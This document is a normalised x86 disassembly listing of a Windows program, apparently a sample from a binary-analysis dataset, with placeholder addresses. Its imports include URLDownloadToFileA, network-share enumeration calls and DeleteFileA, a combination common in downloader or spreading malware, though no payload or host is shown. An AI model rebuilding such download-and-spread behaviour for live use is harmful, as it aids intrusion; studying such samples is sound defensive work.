add eax [ ebp - 0xc ]
mov cl [ ebp - 0x1458 ]
mov [ eax - 0x1 ] cl
mov edx [ ebp - 0x1458 ]
cmp edx [ ebp + 0x14 ]
jle r-xdata
mov eax [ ebp - 0x1040 ]
mov ecx [ ebp + eax * 4 - 0x1038 ]
mov [ ebp - 0x1040 ] ecx
mov edx [ ebp - 0x1458 ]
add edx 0x1
mov [ ebp - 0x1458 ] edx
jmp r-xdata
mov eax [ ebp - 0x1480 ]
mov ecx [ ebp - 0x147c ]
mov [ ebp + eax * 4 - 0x1450 ] ecx
jmp r-xdata
mov edx [ ebp - 0x1480 ]
sar edx 0x1
mov eax [ ebp - 0x1480 ]
mov ecx [ ebp + edx * 4 - 0x1450 ]
mov [ ebp + eax * 4 - 0x1450 ] ecx
mov edx [ ebp - 0x1480 ]
sar edx 0x1
mov [ ebp - 0x1480 ] edx
jmp r-xdata
mov edx [ ebp - 0x824 ]
mov eax [ ebp + edx * 4 - 0x820 ]
and eax 0xffffff00
mov ecx [ ebp - 0x1454 ]
mov edx [ ebp + ecx * 4 - 0x820 ]
and edx 0xffffff00
add eax edx
mov ecx [ ebp - 0x1488 ]
add ecx 0x1
or eax ecx
mov edx [ ebp - 0x8 ]
mov [ ebp + edx * 4 - 0x820 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp + eax * 4 - 0x1038 ] 0xffffffff
mov ecx [ ebp - 0x103c ]
add ecx 0x1
mov [ ebp - 0x103c ] ecx
mov edx [ ebp - 0x103c ]
mov eax [ ebp - 0x8 ]
mov [ ebp + edx * 4 - 0x1450 ] eax
mov ecx [ ebp - 0x103c ]
mov [ ebp - 0x1480 ] ecx
mov edx [ ebp - 0x1480 ]
mov eax [ ebp + edx * 4 - 0x1450 ]
mov [ ebp - 0x147c ] eax
mov eax [ ebp - 0x1478 ]
mov ecx [ ebp + eax * 4 - 0x1450 ]
mov edx [ ebp - 0x1470 ]
mov eax [ ebp + edx * 4 - 0x820 ]
cmp eax [ ebp + ecx * 4 - 0x820 ]
jge r-xdata
mov eax [ ebp - 0x1478 ]
mov ecx [ ebp + eax * 4 - 0x144c ]
mov edx [ ebp - 0x1478 ]
mov eax [ ebp + edx * 4 - 0x1450 ]
mov ecx [ ebp + ecx * 4 - 0x820 ]
cmp ecx [ ebp + eax * 4 - 0x820 ]
jge r-xdata
mov edx [ ebp - 0x1468 ]
mov eax [ ebp - 0x146c ]
mov ecx [ ebp + eax * 4 - 0x1450 ]
mov [ ebp + edx * 4 - 0x1450 ] ecx
mov edx [ ebp - 0x146c ]
mov [ ebp - 0x1468 ] edx
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x146c ]
add eax 0x1
mov [ ebp - 0x146c ] eax
mov edx [ ebp - 0xc ]
cmp edx [ ebp + 0x10 ]
jg r-xdata
jmp r-xdata
mov [ ebp - 0x1 ] 0x1
mov edx [ ebp - 0x1040 ]
cmp [ ebp + edx * 4 - 0x1038 ] 0x0
jl r-xdata
mov ecx [ ebp - 0x1480 ]
sar ecx 0x1
mov edx [ ebp + ecx * 4 - 0x1450 ]
mov eax [ ebp - 0x147c ]
mov ecx [ ebp + eax * 4 - 0x820 ]
cmp ecx [ ebp + edx * 4 - 0x820 ]
jge r-xdata
mov ecx [ ebp - 0x1474 ]
mov edx [ ebp - 0x1478 ]
mov eax [ ebp + edx * 4 - 0x1450 ]
mov [ ebp + ecx * 4 - 0x1450 ] eax
mov ecx [ ebp - 0x1478 ]
mov [ ebp - 0x1474 ] ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x1478 ]
add edx 0x1
mov [ ebp - 0x1478 ] edx
mov eax 0x1
test eax eax
je r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp + eax * 4 - 0x820 ]
sar ecx 0x8
mov [ ebp - 0x1458 ] ecx
mov eax [ ebp - 0x1458 ]
cdq
sub eax edx
sar eax 0x1
add eax 0x1
mov [ ebp - 0x1458 ] eax
mov edx [ ebp - 0x1458 ]
shl edx 0x8
mov eax [ ebp - 0xc ]
mov [ ebp + eax * 4 - 0x820 ] edx
jmp r-xdata
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov edx 0x1
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
sub_413fa0
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov edx [ ebp - 0xc ]
cmp edx [ ebp + 0x14 ]
jg r-xdata
mov esp ebp
pop ebp
retn
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp + 0x18 ]
jge r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x1
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x8 ]
movzx eax [ edx ]
cmp eax [ ebp - 0xc ]
jne r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ edx + ecx * 4 ] eax
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
sub_402425
mov al [ esp + 0x4 ]
retn 0x4
sub_402876
mov eax [ ecx - 0x14 ]
mov [ ecx - 0x24 ] eax
mov eax [ ecx - 0x10 ]
mov [ ecx - 0x20 ] eax
mov eax [ ecx - 0xc ]
mov [ ecx - 0x1c ] eax
mov eax [ ecx - 0x8 ]
mov [ ecx - 0x18 ] eax
add ecx 0xffffffd8
jmp sub_402717
sub_402cba
retn 0x4
sub_402e23
xor al al
retn 0x4
sub_402e28
add ecx 0xfffffff8
jmp sub_405925
sub_402e30
add ecx 0xfffffff8
jmp sub_40596a
sub_402e38
add ecx 0xfffffff8
jmp sub_4059a8
sub_402e40
retn 0x8
sub_402edf
xor eax eax
retn
sub_40322f
mov al [ ecx + 0x258a ]
retn
sub_4032db
sub ecx [ ecx - 0x4 ]
jmp sub_404796
sub_4032e3
mov [ ecx ] rw-data
lea eax [ ecx + 0x208 ]
mov edx [ eax ]
mov edx [ edx + 0x4 ]
mov [ edx + ecx + 0x208 ] rw-data
mov edx [ eax ]
mov edx [ edx + 0x8 ]
mov [ edx + ecx + 0x208 ] rw-data
mov eax [ eax ]
mov eax [ eax + 0xc ]
mov [ eax + ecx + 0x208 ] rw-data
retn
sub_40393e
sub ecx 0x127
jmp sub_402514
sub_403949
sub ecx 0x1b
jmp sub_40492d
sub_403951
sub ecx 0x127
jmp sub_4024dc
sub_40395c
sub ecx 0x127
jmp sub_40242c
sub_403967
sub ecx 0x204d
jmp sub_4030b8
sub_403972
sub ecx [ ecx - 0x4 ]
sub ecx 0x899
jmp sub_4033cc
sub_4039a7
add ecx 0xffffe470
jmp sub_4091f8
sub_4039b2
push esi
mov esi ecx
neg ecx
lea eax [ esi + 0x1b90 ]
sbb ecx ecx
and ecx eax
call sub_4043db
mov ecx esi
pop esi
jmp sub_409062
sub_4039fc
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_40927f
push [ esp + 0x8 ]
lea ecx [ esi + 0x1b90 ]
call sub_4046cb
pop esi
retn 0x4
sub_403a6d
xor eax eax
inc eax
retn 0x4
sub_403a73
xor eax eax
retn 0x4
sub_403a78
push esi
mov esi rw-data
push [ esp + 0x8 ]
mov ecx [ esi ]
call sub_4039fc
add esi 0x4
cmp esi rw-data
jl r-xdata
pop esi
retn 0x4
sub_403da7
sub ecx 0x230
jmp sub_403ce9
sub_403db2
push esi
push edi
mov edi ecx
lea esi [ edi + 0x228 ]
push [ esi ]
call [ CloseHandle@IAT ]
push [ edi + 0x22c ]
or [ esi ] 0xffffffff
call [ ResetEvent@IAT ]
pop edi
pop esi
retn
sub_403e3a
push [ esp + 0x4 ]
add ecx 0x24
push ecx
call [ lstrcpyA@IAT ]
retn 0x4
sub_403ea1
add ecx 0x24
push ecx
push [ esp + 0x8 ]
call [ lstrcpyA@IAT ]
retn 0x4
sub_403eb2
mov eax ecx
and [ eax ] 0x0
retn
j_sub_40423b
jmp sub_40423b
sub_404282
push esi
mov esi ecx
lea ecx [ esi + 0x1c ]
mov [ esi ] rw-data
call sub_4041d1
mov ecx esi
pop esi
jmp sub_40b4e0
sub_404328
push 0x0
call sub_40429b
xor eax eax
retn
sub_404332
mov eax [ ecx + 0x228 ]
retn
sub_404339
push 0x0
push [ ecx + 0x22c ]
call [ WaitForSingleObject@IAT ]
neg eax
sbb eax eax
inc eax
retn
sub_4043db
push esi
mov esi ecx
push [ esi + 0x22c ]
mov [ esi ] rw-data
call [ CloseHandle@IAT ]
mov ecx esi
pop esi
jmp sub_404282
j_sub_40af96
jmp sub_40af96
sub_404912
mov eax [ esp + 0x8 ]
push eax
push [ esp + 0x8 ]
mov [ ecx + 0x4 ] eax
add ecx 0x8
push ecx
call sub_405366
add esp 0xc
retn 0x8
j_sub_405340
jmp sub_405340
j_sub_405354
jmp sub_405354
sub_404b23
mov eax [ esp + 0x4 ]
and [ eax + 0x14 ] 0x0
and [ eax + 0x10 ] 0x0
mov [ eax ] 0x67452301
mov [ eax + 0x4 ] 0xefcdab89
mov [ eax + 0x8 ] 0x98badcfe
mov [ eax + 0xc ] 0x10325476
retn
sub_405319
push [ esp + 0x8 ]
call sub_4052ca
push 0x10
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_405366
push 0x58
push [ esp + 0x1c ]
call sub_405388
add esp 0x18
retn
sub_405687
cmp [ ecx + 0x18 ] 0x0
je r-xdata
mov al 0x1
retn
push [ ecx + 0x19 ]
mov [ ecx + 0x18 ] 0x0
call [ FreeLibrary@IAT ]
test eax eax
setne al
retn
sub_40588f
push 0x0
push [ ecx ]
call [ GetFileSize@IAT ]
retn
sub_40589a
mov eax [ ecx + 0x30 ]
retn
sub_4059dd
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
lea ecx [ eax + esi + 0x4 ]
call sub_40586e
push [ esp + 0x8 ]
mov eax [ esi ]
mov ecx esi
call [ eax ]
pop esi
retn 0x4
sub_405b1b
mov eax [ ecx ]
jmp [ eax + 0x8 ]
sub_405ef0
push esi
mov esi [ esp + 0x8 ]
push 0x10
add ecx 0x12e4
push esi
push ecx
call sub_40a358
add esp 0xc
mov [ esi + 0x21 ] 0x0
mov al 0x1
pop esi
retn 0x4
sub_405f11
push 0x10
add ecx 0x12e4
push ecx
push [ esp + 0xc ]
call sub_405366
add esp 0xc
mov al 0x1
retn 0x4
sub_405f2b
cmp [ esp + 0x4 ] 0x0
mov eax ecx
je r-xdata
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ eax + ecx ] rw-data
retn 0x4
mov [ eax ] rw-data
mov [ eax + 0x28 ] rw-data
sub_405f50
push esi
mov esi ecx
push 0x1
lea ecx [ esi + 0x4 ]
call sub_405f2b
or [ esi ] 0xffffffff
and [ esi + 0x30 ] 0x0
mov eax esi
pop esi
retn
sub_40607c
push esi
push 0x0
push 0x0
mov esi ecx
push 0x12
push [ esi + 0x24c ]
call [ PostMessageA@IAT ]
lea ecx [ esi + 0x230 ]
pop esi
jmp sub_40b42a
sub_4060fc
push esi
mov esi ecx
neg ecx
lea eax [ esi + 0x228 ]
sbb ecx ecx
and ecx eax
call sub_4041d1
mov ecx esi
pop esi
jmp sub_404282
sub_406118
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_40927f
push [ esp + 0x8 ]
lea ecx [ esi + 0x1b90 ]
call sub_40460b
pop esi
retn 0x4
sub_406137
push esi
mov esi ecx
call sub_40455d
lea ecx [ esi + 0x228 ]
call sub_403eb2
mov [ esi ] rw-data
mov eax esi
pop esi
retn
sub_406154
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_40927f
push [ esp + 0x8 ]
lea ecx [ esi + 0x1b90 ]
call sub_4043f8
pop esi
retn 0x4
sub_406173
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_40927f
push [ esp + 0x8 ]
lea ecx [ esi + 0x1b90 ]
call sub_40471d
pop esi
retn 0x4
sub_4061eb
push esi
push [ esp + 0x8 ]
add ecx 0xffffe470
call sub_40950c
mov esi eax
test esi esi
je r-xdata
mov eax esi
pop esi
retn 0x4
push [ esp + 0x8 ]
call [ DeleteFileA@IAT ]
sub_406211
mov eax ecx
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
retn
sub_406224
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_40927f
push [ esp + 0x8 ]
lea ecx [ esi + 0x1b90 ]
call sub_40444a
pop esi
retn 0x4
sub_406243
push esi
mov esi ecx
neg ecx
lea eax [ esi + 0x1b90 ]
sbb ecx ecx
and ecx eax
call sub_4060fc
mov ecx esi
pop esi
jmp sub_409062
sub_4062cf
add ecx 0xffffe470
jmp sub_40950c
sub_4062da
add ecx 0x1b90
jmp sub_40b443
sub_406312
push [ ecx + 0x4 ]
add ecx 0x1b90
push 0xffffffff
call sub_40b3ed
retn
sub_406350
add ecx 0xffffe470
jmp sub_4093de
DeleteFileA
jmp [ DeleteFileA@IAT ]
sub_406537
mov eax [ esp + 0x4 ]
and [ eax ] 0x0
and [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] 0x6a09e667
mov [ eax + 0xc ] 0xbb67ae85
mov [ eax + 0x10 ] 0x3c6ef372
mov [ eax + 0x14 ] 0xa54ff53a
mov [ eax + 0x18 ] 0x510e527f
mov [ eax + 0x1c ] 0x9b05688c
mov [ eax + 0x20 ] 0x1f83d9ab
mov [ eax + 0x24 ] 0x5be0cd19
retn
sub_409062
push esi
mov esi ecx
push [ esi + 0x1758 ]
mov [ esi ] rw-data
call [ UnmapViewOfFile@IAT ]
push [ esi + 0x1750 ]
call [ CloseHandle@IAT ]
mov ecx esi
pop esi
jmp sub_409a41
sub_409187
xor eax eax
retn 0x8
sub_40918c
xor al al
retn
sub_409850
add ecx 0xfffffeb8
jmp sub_405c8d
sub_40985b
add ecx 0xfffffff8
jmp sub_4059dd
sub_409863
add ecx 0xfffffff8
jmp sub_405a4e
sub_40986b
add ecx 0xfffffeb8
jmp sub_405cb4
sub_409876
add ecx 0xfffffff8
jmp sub_405ad1
sub_40987e
add ecx 0xfffffff8
jmp sub_405a93
sub_409886
add ecx 0xfffffeb8
jmp sub_405d59
sub_409891
add ecx 0xfffffff8
jmp sub_405b1b
sub_409978
push [ ecx + 0x4 ]
call [ ReleaseMutex@IAT ]
retn
sub_409982
push 0xffffffff
push [ ecx + 0x4 ]
call [ WaitForSingleObject@IAT ]
xor eax eax
inc eax
retn
sub_409991
mov eax [ ecx ]
jmp [ eax ]
sub_409a41
push esi
mov esi ecx
push [ esi + 0x14 ]
mov [ esi ] rw-data
call [ UnmapViewOfFile@IAT ]
push [ esi + 0xc ]
call [ CloseHandle@IAT ]
pop esi
retn
sub_40a1c3
lea eax [ esp + 0xc ]
push eax
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_40a0f5
add esp 0xc
retn
sub_40a5dc
push esi
lea esi [ ecx + 0x221 ]
cmp [ esi ] 0x0
je r-xdata
mov [ esi ] 0x0
pop esi
retn
call sub_40aabd
sub_40a5f2
push esi
mov esi ecx
jmp r-xdata
call sub_40a49e
test al al
je r-xdata
push 0x2710
call [ Sleep@IAT ]
mov ecx esi
mov al 0x1
pop esi
retn
sub_40a611
mov edx [ esp + 0x4 ]
mov eax [ ecx ]
add edx 0x10
push edx
call [ eax + 0x14 ]
retn 0x8
j_sub_40ab5f
jmp sub_40ab5f
sub_40a686
mov al 0x1
retn 0x4
sub_40a68b
sub ecx [ ecx - 0x4 ]
jmp sub_40a4f1
sub_40a745
and [ ecx + 0x325 ] 0x0
add ecx 0x219
jmp sub_402cbd
j_sub_40ad4c
jmp sub_40ad4c
sub_40a823
mov eax [ ecx ]
jmp [ eax + 0x14 ]
sub_40ab53
add ecx 0x8
push ecx
call sub_409c76
pop ecx
inc eax
retn
sub_40ab5f
push 0x0
add ecx 0x8
push ecx
push [ esp + 0xc ]
call sub_409cdd
add esp 0xc
retn 0x8
sub_40abb1
mov al 0x1
retn 0x8
sub_40ad29
push esi
push [ esp + 0xc ]
mov esi ecx
push [ esp + 0xc ]
call sub_40ab5f
push [ esp + 0xc ]
mov ecx esi
push [ esp + 0xc ]
call sub_40ab74
pop esi
retn 0x8
sub_40adc0
mov [ ecx ] rw-data
lea eax [ ecx + 0x208 ]
mov edx [ eax ]
mov edx [ edx + 0x4 ]
mov [ edx + ecx + 0x208 ] rw-data
mov edx [ eax ]
mov edx [ edx + 0x8 ]
mov [ edx + ecx + 0x208 ] rw-data
mov eax [ eax ]
mov eax [ eax + 0xc ]
mov [ eax + ecx + 0x208 ] rw-data
retn
j_sub_40ab74
jmp sub_40ab74
sub_40af88
xor al al
retn 0x8
sub_40af8d
call sub_40adfd
add eax 0xd
retn
sub_40af96
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_40a0d0
pop ecx
mov [ esi + 0x220 ] eax
mov al 0x1
pop esi
retn 0x8
sub_40b42a
push esi
mov esi ecx
push [ esi + 0x8 ]
call [ SetEvent@IAT ]
push 0xffffffff
push [ esi + 0xc ]
call [ WaitForSingleObject@IAT ]
pop esi
retn
sub_40b443
push 0x0
push [ ecx + 0x8 ]
call [ WaitForSingleObject@IAT ]
neg eax
sbb eax eax
inc eax
retn
sub_40b454
push esi
mov esi ecx
push [ esi + 0x14 ]
call [ SetEvent@IAT ]
push 0xffffffff
push [ esi + 0x10 ]
call [ WaitForSingleObject@IAT ]
pop esi
retn
sub_40b536
push esi
mov esi ecx
push 0x3e8
call [ Sleep@IAT ]
mov ecx esi
call sub_40b443
test eax eax
je r-xdata
xor eax eax
pop esi
retn
UrlMkSetSessionOption
jmp [ UrlMkSetSessionOption@IAT ]
URLDownloadToFileA
jmp [ URLDownloadToFileA@IAT ]
WNetCloseEnum
jmp [ WNetCloseEnum@IAT ]
WNetEnumResourceA
jmp [ WNetEnumResourceA@IAT ]
WNetOpenEnumA
jmp [ WNetOpenEnumA@IAT ]
sub_40b910
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
je r-xdata
pop ebp
retn
mov eax [ ebp + 0xc ]
push eax
call j_sub_405354
add esp 0x4
sub_40b9a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax + 0x34 ] 0x100
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x38 ] 0x0
pop ebp
retn
sub_40c4b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax + 0x25c ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x258 ] 0x0
pop ebp
retn
sub_40c8b0
push ebp
mov ebp esp
movzx eax [ ebp + 0xc ]
push eax
push 0x8
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c790
add esp 0xc
pop ebp
retn
